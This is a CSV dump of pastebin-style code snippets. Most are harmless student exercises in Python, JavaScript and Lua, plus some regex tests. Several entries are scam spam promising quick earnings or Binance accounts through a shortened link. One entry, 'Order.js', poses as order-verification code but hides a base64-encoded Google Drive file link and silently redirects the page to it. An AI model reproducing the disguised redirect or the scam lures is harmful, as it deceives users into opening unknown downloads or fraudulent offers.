id,title,username,language,date,content
4qDjrz1V,Untitled,Xinef,Python,Thursday 3rd of April 2025 01:07:10 AM CDT,"import math


# dla zadanych wierzchołków trójkąta (Ax, Ay), (Bx, By), (Cx, Cy)
# wylicz i zwróć powierzchnię trójkąta
def powierzchniaTrojkata(Ax: float, Ay: float, Bx: float, By:float, Cx: float, Cy: float):
  return 0



# dla zadanych wierzchołków trójkąta (Ax, Ay), (Bx, By), (Cx, Cy)
# oraz dla podanego punktu (Px, Py)
# sprawdź czy punkt P leży w trójkącie poprzez porównanie powierzchni trójkątów
# ABC == ABP + ACP + BCP
# jeśli tak, zwróć True, jeśli nie, zwróć False
def czyWTrojkacie(Ax: float, Ay: float, Bx: float, By:float, Cx: float, Cy: float, Px: float, Py: float):
  return False



if __name__ == '__main__':
  print(""Podaj x i y pierwszego wierzchołka trójkąta: "")
  Ax = float(input())
  Ay = float(input())
  print(""Podaj x i y drugiego wierzchołka trójkąta: "")
  Bx = float(input())
  By = float(input())
  print(""Podaj x i y trzeciego wierzchołka trójkąta: "")
  Cx = float(input())
  Cy = float(input())

  print(""Podaj x i y sprawdzanego punktu: "")
  Px = float(input())
  Py = float(input())


  print(""Trójkąt ("", Ax, "", "", Ay, "")"", ""("", Bx, "", "", By, "")"", ""("", Cx, "", "", Cy, "")"")
  print(""Punkt ("", Px, "", "", Py, "")"")

  print(""Powierzchnia trojkata = "", powierzchniaTrojkata(Ax, Ay, Bx, By, Cx, Cy))
  print(""Powierzchnia trojkataABP = "", powierzchniaTrojkata(Ax, Ay, Bx, By, Px, Py))
  print(""Powierzchnia trojkataACP = "", powierzchniaTrojkata(Ax, Ay, Cx, Cy, Px, Py))
  print(""Powierzchnia trojkataBCP = "", powierzchniaTrojkata(Bx, By, Cx, Cy, Px, Py))

  if(czyWTrojkacie(Ax, Ay, Bx, By, Cx, Cy, Px, Py)):
    print(""Punkt leży w trójkącie"")
  else:
    print(""Punkt NIE leży w trójkącie"")"
wUwTvScE,EARN $900 INSTANTLY 2025 BT,Pitrs7_cz,JavaScript,Thursday 3rd of April 2025 12:57:54 AM CDT," 
Pdf https://tinyurl.com/methodssss


lasYTZeLFT
"
pwn0iBGG,Binance account CW,LeopardDeLuffy,JavaScript,Thursday 3rd of April 2025 12:57:36 AM CDT," 
Pdf https://tinyurl.com/methodssss


o2MdIdXb1x
"
zXMDHr2Q,Testing DW,antonio_pedro,Python,Thursday 3rd of April 2025 12:52:07 AM CDT,"^(?=.*antonio)(?=.*pedro).*

(?i)^.*antonio.*pedro.*|^.*pedro.*antonio.*

(?i)^(?=.*antonio)(?=.*pedro).*

^(?=.*[Aa][Nn][Tt][Oo][Nn][Ii][Oo])(?=.*[Pp][Ee][Dd][Rr][Oo]).*"
xy0dBseF,EARN $900 INSTANTLY 2025 BT,LeopardDeLuffy,JavaScript,Thursday 3rd of April 2025 12:41:29 AM CDT," 
Pdf https://tinyurl.com/methodssss


Jqee1TCOMh
"
YGrXPiBV,Order.js,reflezzzz,JavaScript,Thursday 3rd of April 2025 12:36:06 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/611/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
55u8g1KJ,06.Accordion,Kamend1,JavaScript,Thursday 3rd of April 2025 12:34:16 AM CDT,"function solution() {
    let baseUrl = `http://localhost:3030/jsonstore/advanced/articles/list`;
    let detailUrl = `http://localhost:3030/jsonstore/advanced/articles/details/`;
    let mainSection = document.getElementById('main');
    
    getArticles();

    async function getArticles () {
        
        try{
            let response = await fetch(baseUrl);
            let data = await response.json();
            let titles = Object.values(data);

            for (let item of titles) {
                let title = item.title;
                let id = item._id;

                let articleObiect = await fetch(detailUrl + id);
                let articleDetails = await articleObiect.json();
                let articleBody = articleDetails.content;

                createTitleDiv(title, id, articleBody);
            }


        } catch (error) {
            console.error(error);
        }
        
    }

    function createTitleDiv(title, id, articleBody) {
        let newArticle = document.createElement('div');
        newArticle.classList.add('accordion')

        let newTitle = document.createElement('div');
        newTitle.classList.add('head');

        let titleSpan = document.createElement('span');
        titleSpan.textContent = title;

        let newMoreBtn = document.createElement('button');
        newMoreBtn.classList.add('button');
        newMoreBtn.dataset.id = id;
        newMoreBtn.textContent = 'More';

        newMoreBtn.addEventListener('click', showDetail)

        let extraDiv = document.createElement('div');
        extraDiv.classList.add('extra');
        extraDiv.style.display = 'none';

        let extraPara = document.createElement('p');
        extraPara.textContent = articleBody;


        newTitle.appendChild(titleSpan);
        newTitle.appendChild(newMoreBtn);
        extraDiv.appendChild(extraPara);
        newArticle.appendChild(newTitle);
        newArticle.appendChild(extraDiv);
        mainSection.appendChild(newArticle);
    }

    function showDetail (event) {
        let currentBtn = event.currentTarget;
        let id = currentBtn.dataset.id;
        let parentArticle = currentBtn.parentElement.parentElement;

        let extraDiv = parentArticle.querySelector('.extra');
        
        if (extraDiv) {
            if (extraDiv.style.display === 'block') {
                extraDiv.style.display = 'none';
                currentBtn.textContent = 'More';
            } else {
                extraDiv.style.display = 'block';
                currentBtn.textContent = 'Less';
            }
            return
        };
    }
}

solution();"
9DCTeUKy,Untitled,IgorKan,Lua,Thursday 3rd of April 2025 12:32:21 AM CDT,"do
    local espinfo = node.info(""sw_version"")
    local hw = node.info(""hw"")
    for k, v in pairs(hw) do espinfo[k] = v end
    -- теперь espinfo содержит данные двух таблиц, 
    
    -- результат:
    print('\n\nespinfo:')
    for k, v in pairs(espinfo) do print(k, v) end
    
    -- данные что нужны нам:
    local nest = { 'flash_id', 'chip_id', 'git_commit_dts' }
    newespinfo = {} -- глобальная таблица выборки
    for _, v in pairs(nest) do newespinfo[v] = espinfo[v] end
    -- лучше уничтожить лишние таблицы до выхода из чанка
    espinfo, hw, nest = nil, nil, nil    
    
    -- проверяем результат:
    print('\n\nnewespinfo:')
    for k, v in pairs(newespinfo) do print(k, v) end

end"
xxJFpWbx,05.Locked-profile,Kamend1,JavaScript,Thursday 3rd of April 2025 12:28:51 AM CDT,"async function lockedProfile() {
     
    let baseUrl = `http://localhost:3030/jsonstore/advanced/profiles`;
    let mainSite = document.getElementById('main');

    mainSite.innerHTML = '';

        try {
            let response = await fetch(baseUrl);
            let profileData = await response.json();
            let profiles = Object.values(profileData);
            
            for (let profile of profiles) {
                let username = profile.username;
                let email = profile.email;
                let age = profile.age;
                let idx = profiles.indexOf(profile) + 1;

                let profileCard = createProfileCard(username, email, age, idx);
                mainSite.appendChild(profileCard);
            }

        } catch (error) {
            console.error(error);
        }
        
    function createProfileCard(username, email, age, userIndex) {
        let profileCard = document.createElement('div');
        profileCard.classList.add('profile');
    
        let img = document.createElement('img');
        img.src = './iconProfile2.png';
        img.classList.add('userIcon');
    
        let lockLabel = document.createElement('label');
        lockLabel.textContent = 'Lock';
    
        let lockRadio = document.createElement('input');
        lockRadio.type = 'radio';
        lockRadio.name = `user${userIndex}Locked`;
        lockRadio.value = 'lock';
        lockRadio.checked = true;
    
        let unlockLabel = document.createElement('label');
        unlockLabel.textContent = 'Unlock';
    
        let unlockRadio = document.createElement('input');
        unlockRadio.type = 'radio';
        unlockRadio.name = `user${userIndex}Locked`;
        unlockRadio.value = 'unlock';
    
        let br = document.createElement('br');
        let hr1 = document.createElement('hr');
    
        let usernameLabel = document.createElement('label');
        usernameLabel.textContent = 'Username';
    
        let usernameInput = document.createElement('input');
        usernameInput.type = 'text';
        usernameInput.name = `user${userIndex}Username`;
        usernameInput.value = username;
        usernameInput.disabled = true;
        usernameInput.readOnly = true;
    
        let hiddenDiv = document.createElement('div');
        hiddenDiv.classList.add(`user${userIndex}Username`);
        hiddenDiv.style.display = 'none';
    
        let hr2 = document.createElement('hr');
    
        let emailLabel = document.createElement('label');
        emailLabel.textContent = 'Email:';
    
        let emailInput = document.createElement('input');
        emailInput.type = 'email';
        emailInput.name = `user${userIndex}Email`;
        emailInput.value = email;
        emailInput.disabled = true;
        emailInput.readOnly = true;
    
        let ageLabel = document.createElement('label');
        ageLabel.textContent = 'Age:';
    
        let ageInput = document.createElement('input');
        ageInput.type = 'number';
        ageInput.name = `user${userIndex}Age`;
        ageInput.value = age;
        ageInput.disabled = true;
        ageInput.readOnly = true;
    
        hiddenDiv.appendChild(hr2);
        hiddenDiv.appendChild(emailLabel);
        hiddenDiv.appendChild(emailInput);
        hiddenDiv.appendChild(ageLabel);
        hiddenDiv.appendChild(ageInput);
    
        let showMoreBtn = document.createElement('button');
        showMoreBtn.textContent = 'Show more';
    
        showMoreBtn.addEventListener('click', showMore);
    
        profileCard.appendChild(img);
        profileCard.appendChild(lockLabel);
        profileCard.appendChild(lockRadio);
        profileCard.appendChild(unlockLabel);
        profileCard.appendChild(unlockRadio);
        profileCard.appendChild(br);
        profileCard.appendChild(hr1);
        profileCard.appendChild(usernameLabel);
        profileCard.appendChild(usernameInput);
        profileCard.appendChild(hiddenDiv);
        profileCard.appendChild(showMoreBtn);
    
        return profileCard;
    }
    
    function showMore (event) {
        let button = event.currentTarget;
        let currentProfile = event.currentTarget.parentElement;
        let currentProfileHidden = currentProfile.querySelector('div:last-of-type');
        let currentProfileLock = currentProfile.querySelector('input[type=""radio""][value=""lock""]');
        let isLocked = currentProfileLock.checked;

        if (button.textContent === 'Show more') {
            
            if(!isLocked) {
                button.textContent = 'Hide it';
                currentProfileHidden.style.display = 'block';
            }
        } else {
            button.textContent = 'Show more';
            currentProfileHidden.style.display = 'none';
        }
    }
}

"
K7Hi6cY8,04.Students,Kamend1,JavaScript,Thursday 3rd of April 2025 12:26:53 AM CDT,"function students () {
    let submitBtn = document.getElementById('submit');
    let baseUrl = `http://localhost:3030/jsonstore/collections/students`;
    let tableBody = document.querySelector('#results tbody');

    submitBtn.addEventListener('click', function (e) {
        e.preventDefault;
        addStudent();
    })

    loadStudents();
    
    async function addStudent () {
        let firstName = document.getElementsByName('firstName')[0].value;
        let lastName = document.getElementsByName('lastName')[0].value;
        let facultyNumber = document.getElementsByName('facultyNumber')[0].value;
        let grade = document.getElementsByName('grade')[0].value;

        let newStudent = {
            firstName: firstName,
            lastName: lastName,
            facultyNumber: facultyNumber,
            grade: grade,
        }

        if (!firstName || !lastName || !facultyNumber || !grade) {
            return;
        }

        try {
            await fetch (baseUrl, {
                method: 'post',
                headers: { 'Content-type': 'application/json' },
                body: JSON.stringify(newStudent),
        })

        loadStudents();

        } catch (error) {
            console.error(error);
        }
    }

    async function loadStudents () {
        try {
            let response = await fetch(baseUrl);
            let studentData = await response.json();

            let students = Object.values(studentData);

            for (let student of students) {
                let newRow = document.createElement('tr');
                
                let firstNameCell = document.createElement('td');
                firstNameCell.textContent = student.firstName;
                newRow.appendChild(firstNameCell);

                let lastNameCell = document.createElement('td');
                lastNameCell.textContent = student.lastName;
                newRow.appendChild(lastNameCell);
                
                let facultyNumberCell = document.createElement('td');
                facultyNumberCell.textContent = student.facultyNumber;
                newRow.appendChild(facultyNumberCell);

                let gradeCell = document.createElement('td');
                gradeCell.textContent = student.grade;
                newRow.appendChild(gradeCell);

                tableBody.appendChild(newRow);
            }

        } catch (error) {
            console.error(error);
        }

    }
}

students();"
